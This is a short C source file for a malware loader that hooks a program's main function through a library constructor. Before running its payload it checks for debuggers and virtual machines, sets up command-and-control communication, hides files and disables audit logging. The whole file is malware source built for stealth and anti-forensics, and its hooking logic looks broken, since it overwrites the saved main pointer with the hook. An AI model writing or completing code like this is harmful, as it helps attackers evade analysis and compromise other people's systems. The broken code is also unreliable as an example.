#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include "payload.h"
#include "evasion.h"
#include "c2_communication_fixed.h"
#include "config.h"

static int (*original_main)() = NULL;

int hook_main() {
	// Initialize evasion techniques
	if (evasion_check_debugger()) {
		return 0; // Exit if debugger detected
	}

	if (evasion_check_vm()) {
		return 0; // Exit if VM detected
	}

	// Initialize payload
	if (payload_init() != 0) {
		return 0;
	}

	// Initialize C2 communication
	if (c2_init() != 0) {
		payload_cleanup();
		return 0;
	}

	// Hide files
	evasion_hide_files();

	// Disable audit logging
	evasion_disable_audit();

	// Call original main function
	if (original_main) {
		return original_main();
	}

	return 0;
}

__attribute__((constructor))
void init_hook() {
	// Get original main function
	original_main = dlsym(RTLD_NEXT, "main");
	if (!original_main) {
		return;
	}

	// Replace main with our hook
	*(void **)&original_main = hook_main;
}
